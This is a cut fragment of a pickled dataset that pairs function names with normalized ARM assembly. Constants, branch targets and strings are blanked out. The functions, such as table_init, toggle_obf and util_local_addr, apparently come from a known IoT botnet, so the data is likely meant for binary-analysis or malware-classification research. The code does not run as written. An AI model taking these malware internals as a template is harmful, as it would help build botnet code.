0,-0]\nCMP~R5,R12\nMOVLT~R5,R12\nLDR~R3,[SP,0]\nADD~R0,R3,0\nCMP~R0,0\nSTR~R0,[SP,0]\nBLE~FOO\nMOV~R12,0\nMOV~R4,0\nSTR~R12,[SP,0]\nCMP~R5,R6\nMOVGE~R0,R5\nMOVLT~R0,R6\nADD~R12,SP,0\nMOV~R3,R4\nADD~R12,R12,0\nADD~R1,SP,0\nADD~R2,SP,0\nADD~R0,R0,0\nSTR~R12,[SP]\nSTR~R4,[SP,0]\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nSTR~R4,[SP,0]\nSTR~R0,[R3]\nLDR~R3,<STR>\nLDR~R2,[R3]\nMOV~R3,0\nMLA~R4,R3,R4,R2\nLDR~R2,[R4,0]\nCMN~R2,0\nBEQ~FOO\nADD~R12,SP,0\nMOV~R3,R2,LSR0\nADD~R12,R12,0\nADD~R3,R12,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R2,0\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nMOV~R12,0\nADD~R3,SP,0\nLDR~R0,[R4,0]\nADD~R3,R3,0\nMOV~R2,R12\nMOV~R5,0\nMOV~R1,0\nSTR~R5,[SP,0]\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nORRS~R0,R0,R3\nBNE~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nBL~FOO\nLDR~R3,<STR>\nLDRB~R2,[R3,0]\nLDRB~R1,[R3]\nORR~R1,R1,R2,LSL0\nBL~FOO\nLDR~R3,<STR>\nLDR~LR,[R3]\nLDR~R3,<STR>\nMOV~R0,R0,LSL0\nLDR~R3,[R3]\nMOV~R0,R0,LSR0\nMOV~R12,R5\nB~FOO\nMOV~R1,R3\nLDRB~R2,[R1,0]\nLDRB~R3,[R3,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R0\nBHI~FOO\nLDRB~R3,[R1,0]\nLDRB~R2,[R1,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R0\nBHI~FOO\nADD~R12,R12,0\nADD~R3,R1,0\nCMP~R12,LR\nBLT~FOO\nMOV~R1,0\nMOV~R3,0\nSTR~R1,[R4]\nSTR~R3,[R4,0]\nB~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R5,[R4,0]\nSTR~R3,[R4,0]\nSTRB~R5,[R4,0]\nB~FOO\nLDR~R2,[R4,0]\nADD~LR,SP,0\nMOV~R3,R2,LSR0\nADD~LR,LR,0\nADD~R3,LR,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R2,0\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nADD~R0,R4,0\nADD~R1,R4,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[R4,0]\nSUB~R3,R3,0\nSTR~R3,[R4,0]\nLDR~R1,[SP,0]\nMOV~R3,0\nSTR~R3,[R1]\nLDR~R1,[R4,0]\nADD~R9,R4,0\nRSB~R2,R1,0\nLDR~R0,[R4,0]\nADD~R1,R9,R1\nADD~R3,R3,0\nBL~FOO\nCMP~R0,0\nLDREQ~R2,[SP,0]\nMOVEQ~R3,0\nSTREQ~R3,[R2]\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R10,[SP,0]\nLDR~R3,[R10]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R4,0]\nBL~FOO\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nCMP~R3,0\nSTRB~R3,[R4,0]\nMOV~R2,0\nMOVHI~R3,0\nSTR~R2,[R4,0]\nSTRHI~R3,[R4,0]\nSTRHIB~R3,[R4,0]\nBHI~FOO\nMOV~R0,R4\nBL~FOO\nB~FOO\nLDR~R2,<STR>\nLDR~R3,[R4,0]\nLDR~R2,[R2]\nADD~R3,R3,R0\nSTR~R3,[R4,0]\nSTR~R2,[R4,0]\nLDR~R3,[R4,0]\nSUB~R3,R3,0\nCMP~R3,0\nLDRLS~PC,[PC,R3,LSL0]\nB~FOO\nADD~R5,R4,0\nMOV~R8,0\nB~FOO\nLDRB~R3,[R5]\nCMP~R3,0\nBNE~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nADDEQ~R5,R5,0\nADDEQ~R8,R8,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R6,SP,0\nADD~R6,R6,0\nADD~R7,SP,0\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R0,R6\nADD~R7,R7,0\nBL~FOO\nMOV~R2,0\nLDR~R1,<STR>\nMOV~R0,R7\nBL~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBNE~FOO\nMOV~R1,R6\nLDR~R0,[R4,0]\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R1,R7\nLDR~R0,[R4,0]\nMOV~R2,0\nMOV~R3,0\nADD~R5,R5,0\nADD~R8,R8,0\nBL~FOO\nB~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R2,0\nLDRB~R3,[R2,R5]\nCMP~R3,0\nMOVEQ~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nMOV~R3,0\nSTRB~R3,[R2,R5]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nMOV~R1,R5\nLDR~R0,[R4,0]\nMOV~R3,0\nBL~FOO\nADD~R5,R5,0\nADD~R8,R8,0\nLDR~R3,[R4,0]\nCMP~R8,R3\nBLT~FOO\nCMP~R8,0\nMOVGT~R3,0\nBGT~FOO\nB~FOO\nLDR~R1,[R4,0]\nSUB~R0,R1,0\nB~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R8,R0,0\nCMN~R8,0\nBNE~FOO\nB~FOO\nSUB~R0,R0,0\nCMP~R0,0\nBGT~FOO\nMOV~R0,R9\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R8,R0\nBNE~FOO\nMOV~R0,R9\nLDR~R1,[R4,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R8,R0\nBEQ~FOO\nCMP~R8,0\nBLE~FOO\nLDR~R3,[R4]\nLDR~R0,[R4,0]\nLDRB~R2,[R3,0]\nLDR~R1,[R3]\nMOV~R3,0\nBL~FOO\nMOV~R3,0\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nLDR~R1,[R4,0]\nSUB~R0,R1,0\nB~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R8,R0,0\nCMN~R8,0\nBNE~FOO\nB~FOO\nSUB~R0,R0,0\nCMP~R0,0\nBGT~FOO\nMOV~R0,R9\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R8,R0\nBEQ~FOO\nCMP~R8,0\nBLE~FOO\nLDR~R3,[R4]\nLDR~R0,[R4,0]\nLDRB~R2,[R3,0]\nLDR~R1,[R3,0]\nMOV~R3,0\nBL~FOO\nMOV~R3,0\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R3,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R8,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R0\nMOV~R3,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nLDR~R1,<STR>\nMOV~R2,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R8,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R0\nMOV~R3,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nLDR~R1,<STR>\nMOV~R2,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R8,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R0\nMOV~R3,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nLDR~R1,<STR>\nMOV~R2,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R8,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R0\nMOV~R3,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nLDR~R1,<STR>\nMOV~R2,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R8,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R0\nMOV~R3,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nLDR~R1,<STR>\nMOV~R2,0\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nB~FOO\nADD~R11,SP,0\nMOV~R0,0\nADD~R11,R11,0\nBL~FOO\nMOV~R1,R11\nMOV~R0,0\nBL~FOO\nLDR~R3,[SP,0]\nMOV~R2,R0\nSUB~R3,R3,0\nMOV~R0,R9\nLDR~R1,[R4,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4,0]\nBL~FOO\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nMOV~R5,0\nCMP~R3,0\nSTR~R5,[R4,0]\nSTRB~R3,[R4,0]\nBNE~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,R11\nMOV~R0,0\nBL~FOO\nLDR~R3,[SP,0]\nMOV~R2,R0\nSUB~R3,R3,0\nLDR~R1,[R4,0]\nMOV~R0,R9\nBL~FOO\nMOV~R8,R0\nMOV~R0,0\nBL~FOO\nCMN~R8,0\nBNE~FOO\nB~FOO\nMOV~R3,0\nMOV~R8,0\nSTR~R3,[R4,0]\nSTRB~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R8,R5\nB~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nORR~R2,R2,R3,LSL0\nLDR~R3,[R4,0]\nMOV~R1,R2,ASR0\nSTR~R3,[SP,0]\nSTRB~R1,[SP,0]\nSTRB~R2,[SP,0]\nLDR~R10,[R4]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R7,R3\nORRGT~R7,R3,0\nCMP~R7,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,R7\nBL~FOO\nCMN~R0,0\nMOV~R5,R0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,R7\nMOV~R0,0\nBL~FOO\nBL~FOO\nSUBS~R6,R0,0\nBEQ~FOO\nMOV~R8,0\nLDR~R4,[R6,0]\nSTRB~R8,[SP,0]\nSTRB~R7,[SP,0]\nBL~FOO\nLDRB~R1,[R6]\nBL~FOO\nLDR~R3,[R4,R0,LSL0]\nMOV~R1,R7\nMOV~R0,0\nSTR~R3,[SP,0]\nBL~FOO\nLDRB~R2,[R0,0]\nLDRB~R3,[R0]\nORR~R3,R3,R2,LSL0\nMOV~R2,R3,ASR0\nMOV~R0,R6\nSTRB~R2,[SP,0]\nSTRB~R3,[SP,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,R11\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R5\nSTRB~R7,[SP,0]\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R5\nBL~FOO\nADD~R1,SP,0\nMOV~R2,R8\nADD~R1,R1,0\nMOV~R3,0\nMOV~R0,R5\nBL~FOO\nADD~R1,R10,0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R5\nBL~FOO\nLDR~R1,[R10]\nLDRB~R2,[R10,0]\nMOV~R3,0\nMOV~R0,R5\nBL~FOO\nADD~R1,R10,0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nLDRB~R2,[R10,0]\nLDR~R1,[R10,0]\nMOV~R3,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R0,R7\nB~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nADD~R3,R3,0\nB~FOO\nCMP~R8,0\nBEQ~FOO\nLDR~R2,[R4,0]\nCMP~R2,R8\nMOVLT~R1,R2\nMOVGE~R1,R8\nRSB~R2,R1,R2\nSTR~R2,[R4,0]\nADD~R1,R9,R1\nMOV~R0,R9\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nCMP~R4,0\nSTR~R4,[SP,0]\nBLE~FOO\nB~FOO\nCMP~R8,0\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p311
L5848L
tp312
a(S'table_retrieve_val'
p313
S'"LDR~R12,<STR>\nMOV~R0,R0,LSL0\nADD~R3,R0,R12\nCMP~R1,0\nLDRNEB~R2,[R3,0]\nLDRNEB~R3,[R3,0]\nLDR~R0,[R0,R12]\nORRNE~R3,R3,R2,LSL0\nSTRNE~R3,[R1]\nRET"'
p314
L40L
tp315
a(S'toggle_obf'
p316
S'"LDR~R3,<STR>\nSTMFD~SP!,{R4,R5,LR}\nLDR~R2,[R3]\nLDR~R3,<STR>\nAND~R0,R0,0\nMOV~R1,R2,LSR0\nMOV~R12,R2,LSR0\nADD~LR,R3,R0,LSL0\nAND~R5,R1,0\nAND~R4,R12,0\nAND~R1,R2,0\nMOV~R12,R2,LSR0\nMOV~R0,0\nB~FOO\nLDR~R2,[LR]\nLDRB~R3,[R0,R2]\nEOR~R3,R1,R3\nSTRB~R3,[R0,R2]\nLDR~R2,[LR]\nLDRB~R3,[R0,R2]\nEOR~R3,R5,R3\nSTRB~R3,[R0,R2]\nLDR~R2,[LR]\nLDRB~R3,[R0,R2]\nEOR~R3,R4,R3\nSTRB~R3,[R0,R2]\nLDR~R2,[LR]\nLDRB~R3,[R0,R2]\nEOR~R3,R12,R3\nSTRB~R3,[R0,R2]\nADD~R0,R0,0\nLDRB~R3,[LR,0]\nLDRB~R2,[LR,0]\nORR~R3,R3,R2,LSL0\nCMP~R0,R3\nBLT~FOO\nLDMFD~SP!,{R4,R5,PC}"'
p317
L148L
tp318
a(S'table_lock_val'
p319
S'"AND~R0,R0,0\nB~FOO"'
p320
L8L
tp321
a(S'table_unlock_val'
p322
S'"AND~R0,R0,0\nB~FOO"'
p323
L8L
tp324
a(S'add_entry'
p325
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R4,R0\nMOV~R0,R2\nMOV~R5,R2\nMOV~R6,R1\nBL~FOO\nMOV~R1,R6\nMOV~R2,R5\nMOV~R7,R0\nBL~FOO\nLDR~R2,<STR>\nAND~R4,R4,0\nADD~R1,R2,R4,LSL0\nMOV~R3,R5,ASR0\nSTRB~R3,[R1,0]\nSTR~R7,[R2,R4,LSL0]\nSTRB~R5,[R1,0]\nLDMFD~SP!,{R4-R7,PC}"'
p326
L72L
tp327
a(S'table_init'
p328
S'"STR~LR,[SP,-0]\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,0\nMOV~R2,0\nLDR~LR,[SP]\nB~FOO"'
p329
L808L
tp330
a(S'util_strlen'
p331
S'"MOV~R2,R0\nMOV~R0,0\nB~FOO\nADD~R0,R0,0\nLDRB~R3,[R0,R2]\nCMP~R3,0\nBNE~FOO\nRET"'
p332
L32L
tp333
a(S'util_memcpy'
p334
S'"MOV~R12,0\nB~FOO\nLDRB~R3,[R12,R1]\nSTRB~R3,[R12,R0]\nADD~R12,R12,0\nSUBS~R2,R2,0\nBCS~FOO\nRET"'
p335
L32L
tp336
a(S'util_strcpy'
p337
S'"STMFD~SP!,{R4,LR}\nMOV~R4,0\nB~FOO\nMOV~R4,R2\nLDRB~R3,[R4,R1]\nCMP~R3,0\nADD~R2,R4,0\nBNE~FOO\nBL~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p338
L44L
tp339
a(S'util_zero'
p340
S'"MOV~R2,0\nB~FOO\nMOV~R3,0\nSTRB~R3,[R2,R0]\nADD~R2,R2,0\nSUBS~R1,R1,0\nBCS~FOO\nRET"'
p341
L32L
tp342
a(S'util_itoa'
p343
S'"STMFD~SP!,{R4-R8,LR}\nSUBS~R7,R2,0\nSUB~SP,SP,0\nMOV~R6,R1\nBEQ~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQB~R3,[R7]\nSTREQB~R0,[R7,0]\nBEQ~FOO\nMOV~R3,R0,LSR0\nCMP~R1,0\nMOVNE~R3,0\nANDEQ~R3,R3,0\nCMP~R3,0\nMOVEQ~R8,R3\nMOVEQ~R4,R0\nMOV~R3,0\nRSBNE~R4,R0,0\nMOVNE~R8,0\nMOV~R5,0\nSTRB~R3,[SP,0]\nB~FOO\nBL~FOO\nADD~R1,SP,0\nCMP~R0,0\nADD~R2,R0,0\nADD~R3,R1,R5\nADDGT~R2,R0,0\nMOV~R1,R6\nMOV~R0,R4\nSTRB~R2,[R3,-0]\nBL~FOO\nSUB~R5,R5,0\nMOV~R4,R0\nCMP~R4,0\nMOV~R0,R4\nMOV~R1,R6\nBNE~FOO\nCMP~R8,0\nADDNE~R3,SP,0\nADDNE~R2,R3,R5\nADDEQ~R5,R5,0\nMOVNE~R3,0\nADD~R1,SP,0\nSTRNEB~R3,[R2,-0]\nADD~R1,R1,R5\nMOV~R0,R7\nBL~FOO\nMOV~R0,R7\nADD~SP,SP,0\nLDMFD~SP!,{R4-R8,PC}"'
p344
L208L
tp345
a(S'util_memsearch'
p346
S'"CMP~R3,R1\nSTMFD~SP!,{R4,R5,LR}\nMOV~R5,R0\nMOVLE~R0,0\nMOV~LR,R3\nMOV~R4,R2\nMOVLE~R12,R0\nBLE~FOO\nB~FOO\nLDRB~R2,[R4,R12]\nLDRB~R3,[R0,R5]\nCMP~R3,R2\nADD~R12,R12,0\nMOVNE~R12,0\nBNE~FOO\nCMP~R12,LR\nBNE~FOO\nADD~R0,R0,0\nLDMFD~SP!,{R4,R5,PC}\nADD~R0,R0,0\nCMP~R0,R1\nBLT~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,R5,PC}"'
p347
L96L
tp348
a(S'util_atoi'
p349
S'"STMFD~SP!,{R4-R8,R10,LR}\nMOV~R4,R0\nMOV~R7,R1\nLDRB~R2,[R4]\nAND~R3,R2,0\nCMP~R3,0\nCMPNE~R3,0\nMOV~R6,R2\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nB~FOO\nLDRB~R6,[R4]\nMOV~R5,0\nMOV~R8,0\nB~FOO\nCMP~R2,0\nLDREQB~R6,[R4]\nMOV~R5,0\nMOV~R8,0\nMOV~R1,R7\nMOV~R0,R5\nBL~FOO\nMOV~R1,R7\nMOV~R10,R0\nMOV~R0,R5\nBL~FOO\nMOV~LR,R0\nMOV~R0,0\nMOV~R12,R0\nAND~R3,R6,0\nSUB~R2,R3,0\nCMP~R2,0\nSUB~R1,R3,0\nSUB~R2,R6,0\nSUB~R3,R3,0\nBLS~FOO\nCMP~R3,0\nMOVHI~R2,0\nMOVLS~R2,0\nCMP~R3,0\nCMPHI~R1,0\nBHI~FOO\nCMP~R2,0\nMOVEQ~R3,0\nMOVNE~R3,0\nRSB~R2,R3,R6\nCMP~R2,R7\nBGE~FOO\nCMP~R0,LR\nMOVLS~R3,0\nMOVHI~R3,0\nORRS~R12,R3,R12,LSR0\nMOV~R12,0\nBNE~FOO\nCMP~R0,LR\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R2,R10\nMOVLE~R3,0\nCMP~R3,0\nMLAEQ~R0,R7,R0,R2\nADDEQ~R12,R12,0\nLDRB~R6,[R4]\nB~FOO\nCMP~R12,0\nBGE~FOO\nCMP~R8,0\nMOVEQ~R0,0\nMOVNE~R0,0\nLDMFD~SP!,{R4-R8,R10,PC}\nCMP~R8,0\nRSBNE~R0,R0,0\nLDMFD~SP!,{R4-R8,R10,PC}\nCMP~R2,0\nBNE~FOO\nB~FOO"'
p350
L308L
tp351
a(S'util_fdgets'
p352
S'"STMFD~SP!,{R4-R8,LR}\nMOV~R6,R0\nMOV~R8,R1\nMOV~R7,R2\nMOV~R4,R0\nMOV~R5,0\nMOV~R1,R4\nMOV~R0,R7\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nMOV~R3,R4\nADD~R4,R4,0\nBNE~FOO\nADD~R5,R5,0\nCMP~R5,R8\nBGE~FOO\nLDRB~R3,[R3]\nCMP~R3,0\nBNE~FOO\nCMP~R5,0\nMOVNE~R0,R6\nMOVEQ~R0,0\nLDMFD~SP!,{R4-R8,PC}"'
p353
L96L
tp354
a(S'util_local_addr'
p355
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R4,0\nSUB~SP,SP,0\nSTR~R4,[SP,0]\nBL~FOO\nMOV~R6,0\nSTR~R6,[R0]\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,R6\nBL~FOO\nCMN~R0,0\nMOV~R7,SP\nMOV~R5,R0\nMOV~R2,R4\nMOV~R1,SP\nMOV~R3,R6\nBEQ~FOO\nMOV~R3,0\nSTRB~R3,[SP]\nLDR~R3,<STR>\nSTR~R3,[SP,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R6,[SP,0]\nSTRB~R6,[SP,0]\nBL~FOO\nMOV~R1,SP\nADD~R2,SP,0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R3,[SP,0]\nMOV~R0,R3\nADD~SP,SP,0\nLDMFD~SP!,{R4-R7,PC}"'
p356
L148L
tp357
a(S'util_stristr'
p358
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R7,R0\nMOV~R6,R2\nMOV~R5,0\nB~FOO\nADD~R5,R5,0\nLDRB~R3,[R5,R6]\nCMP~R3,0\nBNE~FOO\nMOV~R4,R3\nMOV~R0,R7\nB~FOO\nLDRB~LR,[R0]\nLDRB~R12,[R6,R4]\nSUB~R3,LR,0\nSUB~R2,R12,0\nCMP~R3,0\nORRLS~LR,LR,0\nCMP~R2,0\nORRLS~R12,R12,0\nCMP~LR,R12\nADD~R4,R4,0\nMOVNE~R4,0\nBNE~FOO\nCMP~R4,R5\nBNE~FOO\nRSB~R0,R7,R0\nLDMFD~SP!,{R4-R7,PC}\nCMP~R1,0\nSUB~R1,R1,0\nBGT~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R7,PC}"'
p359
L132L
tp360
a(S'util_strcmp'
p361
S'"MOV~R12,0\nB~FOO\nADD~R12,R12,0\nLDRB~R3,[R12,R0]\nCMP~R3,0\nBNE~FOO\nMOV~R2,R3\nB~FOO\nADD~R2,R2,0\nLDRB~R3,[R2,R1]\nCMP~R3,0\nBNE~FOO\nCMP~R12,R2\nMOVEQ~R12,R2\nBEQ~FOO\nB~FOO\nLDRB~R2,[R0]\nLDRB~R3,[R1]\nCMP~R2,R3\nBNE~FOO\nADD~R0,R0,0\nADD~R1,R1,0\nSUBS~R12,R12,0\nBCS~FOO\nMOV~R0,0\nRET\nMOV~R0,0\nRET"'
p362
L112L
tp363
a(S'util_strncmp'
p364
